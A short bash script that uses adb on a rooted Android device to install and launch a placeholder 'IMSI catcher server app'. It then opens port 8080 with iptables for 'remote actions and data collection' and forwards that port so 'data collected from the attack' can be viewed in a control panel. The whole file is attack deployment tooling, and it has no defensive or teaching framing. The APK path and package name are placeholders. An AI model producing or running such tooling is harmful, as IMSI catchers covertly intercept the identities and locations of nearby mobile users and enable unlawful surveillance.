#!/bin/bash

# Check if the device is rooted
if ! adb shell "su -c 'echo Rooted'"; then
  echo "Device is not rooted. Exiting..."
  exit 1
fi

# Install the IMSI catcher server app
adb install -r path/to/imsi_catcher_server_app.apk

# Start the IMSI catcher server app
adb shell "am start -n com.example.imsi_catcher/.MainActivity"

# Set up control mechanisms for remote actions and data collection
adb shell "su -c 'iptables -A INPUT -p tcp --dport 8080 -j ACCEPT'"
adb shell "su -c 'iptables -A OUTPUT -p tcp --sport 8080 -j ACCEPT'"

# Collect and view data collected from the attack
adb forward tcp:8080 tcp:8080
echo "IMSI catcher server app deployed successfully. Access the control panel at http://localhost:8080"

